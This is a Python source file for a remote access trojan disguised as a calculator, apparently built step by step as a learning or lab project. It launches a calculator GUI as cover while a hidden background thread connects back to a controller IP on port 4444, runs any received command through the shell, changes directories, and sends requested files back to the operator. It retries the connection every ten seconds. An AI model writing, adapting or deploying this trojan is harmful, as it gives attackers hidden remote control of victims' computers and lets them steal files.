import socket
import subprocess
import os  # Essential for 'cd' commands
import threading # <--- Crucial for Phase 3
from calculator_gui import run_calculator


def send_data(s, data):
    if isinstance(data, str): data = data.encode()
    header = f"{len(data):016d}".encode()
    s.sendall(header + data)

def recv_data(s):
    header = s.recv(16).decode().strip()
    if not header: return ""
    total_size = int(header)
    data = b""
    while len(data) < total_size:
        data += s.recv(4096)
    return data.decode()

def rat_logic():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # REPLACE with your Controller IP
            client.connect(("192.168.141.5", 4444))

            while True:
                command = recv_data(client)
                if command.lower() == "exit": break

                # 1. Handle Built-in 'cd'
                if command.startswith("cd "):
                    try:
                        os.chdir(command[3:].strip())
                        send_data(client, f"Current directory: {os.getcwd()}")
                    except Exception as e:
                        send_data(client, f"Error: {str(e)}")
                
                # 2. Handle Built-in 'download'
                elif command.startswith("download "):
                    try:
                        with open(command[9:].strip(), "rb") as f:
                            send_data(client, f.read())
                    except Exception as e:
                        send_data(client, f"Error: {str(e)}")

                # 3. Handle System Commands (dir, ls, ipconfig)
                else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    send_data(client, output if output else b"Done.")

            client.close()
        except (socket.error, ConnectionRefusedError):
            # Wait 10 seconds before trying to "call home" again
            time.sleep(10)
            continue


def host_application():
    # Use subprocess to launch the actual Windows Calculator
    # 'start' is a shell command that opens the app and lets the script continue
    try:
        subprocess.Popen("calc.exe", shell=True)
    except Exception as e:
        print(f"Could not start host app: {e}")

if __name__ == "__main__":
    # 1. Start the RAT in the background
    rat_thread = threading.Thread(target=rat_logic)
    rat_thread.daemon = True # This ensures the RAT dies if the main app is closed
    rat_thread.start()

    # 2. Start the visible "Host" app
    run_calculator()
    #host_application()